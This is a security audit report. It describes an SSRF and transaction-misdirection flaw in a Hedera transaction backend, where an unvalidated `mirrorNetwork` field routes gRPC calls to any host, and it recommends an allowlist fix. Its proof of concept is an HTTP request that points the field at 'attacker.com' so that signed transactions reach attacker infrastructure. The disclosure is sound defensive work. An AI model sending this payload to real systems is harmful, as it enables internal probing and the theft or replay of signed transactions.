Audit Report

## Title
Unvalidated `mirrorNetwork` Field Allows Arbitrary Network Routing and SSRF During Transaction Execution

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any arbitrary string with no allowlist enforcement. The backend uses this value verbatim to open outbound gRPC connections and build a Hedera SDK client, both at transaction creation time and at execution time. Any authenticated user can supply an attacker-controlled hostname, causing the backend to make two outbound gRPC connections to that host per transaction lifecycle and ultimately submit signed transaction bytes to attacker-controlled infrastructure.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` applies only `@IsNotEmpty()` and `@IsString()` to `mirrorNetwork`: [1](#0-0) 

No `@IsIn()`, `@IsEnum()`, or any other allowlist constraint is present. The infrastructure-level constants `mainnet`, `testnet`, `previewnet`, and `local-node` are defined in `client.ts` but never enforced at the DTO layer.

**Step 1 — creation path calls `getClientFromNetwork` with the raw value and persists it:**

`createTransactions` passes `dtos[0].mirrorNetwork` directly to `getClientFromNetwork`: [2](#0-1) 

The prepared data's `mirrorNetwork` (which equals `dto.mirrorNetwork`) is then stored verbatim in the `Transaction` row: [3](#0-2) 

**Step 2 — `getClientFromNetwork` makes an outbound gRPC connection to the supplied URL:**

When the value is not one of the four known strings, the function falls through to the custom-network branch, opens a gRPC connection to the attacker-supplied host, and fetches the address book from it: [4](#0-3) 

`MirrorNetworkGRPC.fromBaseURL` in the default case appends `:443` and returns the raw attacker-supplied string as the gRPC endpoint: [5](#0-4) 

**Step 3 — node validation runs against the attacker-supplied address book:**

`validateAndPrepareTransaction` derives `allowedNodes` from the client that was built using the attacker's address book: [6](#0-5) 

Because the attacker controls the address book response, they can echo back any node IDs they choose, trivially passing `isTransactionValidForNodes`.

**Step 4 — execution path re-uses the stored value (SSRF hit #2):**

`_executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` again with the persisted attacker-controlled value, then submits the fully-signed transaction bytes to whatever nodes the attacker's address book advertised: [7](#0-6) 

## Impact Explanation

- **SSRF**: The backend makes two outbound gRPC connections to an attacker-controlled host per transaction lifecycle (once at creation, once at execution). This can be used to probe internal services reachable from the backend pod (e.g., metadata endpoints, internal APIs, other microservices on the same network segment).
- **Transaction misdirection**: Fully-signed multi-party transactions (potentially carrying significant HBAR or token operations) are submitted to attacker-controlled infrastructure instead of the real Hedera network. The attacker receives the signed transaction bytes, can withhold submission, replay them later, or observe sensitive transaction contents.
- **Node validation bypass**: The `isTransactionValidForNodes` check is rendered meaningless because the node set it validates against is itself sourced from the attacker's gRPC server.

## Likelihood Explanation

Any authenticated organization-mode user can reach `POST /transactions` without elevated privilege. The `mirrorNetwork` field is a normal part of the documented API contract. No leaked credentials or admin access are required. The attacker only needs to run a gRPC server that speaks the Hedera SDK's `AddressBookQuery` protocol, which is publicly documented and has open-source reference implementations.

## Recommendation

Enforce an allowlist on `mirrorNetwork` at the DTO layer. The four valid values are already defined as constants in `back-end/libs/common/src/utils/sdk/client.ts` (`mainnet`, `testnet`, `previewnet`, `local-node`). Apply `@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])` (or `@IsEnum`) to the `mirrorNetwork` field in `CreateTransactionDto`:

```typescript
// back-end/apps/api/src/transactions/dto/create-transaction.dto.ts
@IsNotEmpty()
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

If custom/private network support is a product requirement, it must be gated behind an admin-only role check and the custom URL must be validated against a server-side allowlist, not accepted verbatim from user input.

## Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_org_user_jwt>
Content-Type: application/json

{
  "name": "SSRF test",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<valid_hex_encoded_transaction_bytes>",
  "creatorKeyId": 1,
  "signature": "<valid_hex_signature>",
  "mirrorNetwork": "attacker.com"
}
```

**Expected (vulnerable) behavior:**
1. Backend calls `getClientFromNetwork("attacker.com")`.
2. `MirrorNetworkGRPC.fromBaseURL("attacker.com")` returns `["attacker.com:443"]`.
3. Backend opens a gRPC connection to `attacker.com:443` and issues an `AddressBookQuery` — **SSRF hit #1**.
4. Attacker's gRPC server returns a crafted `NodeAddressBook` containing node IDs that match those in the submitted transaction bytes.
5. `isTransactionValidForNodes` passes because the allowed-node set came from the attacker.
6. Transaction is saved to the database with `mirrorNetwork = "attacker.com"`.
7. When the chain service later executes the transaction, `_executeTransaction` calls `getClientFromNetwork("attacker.com")` again — **SSRF hit #2** — and submits the signed transaction bytes to the attacker's nodes.
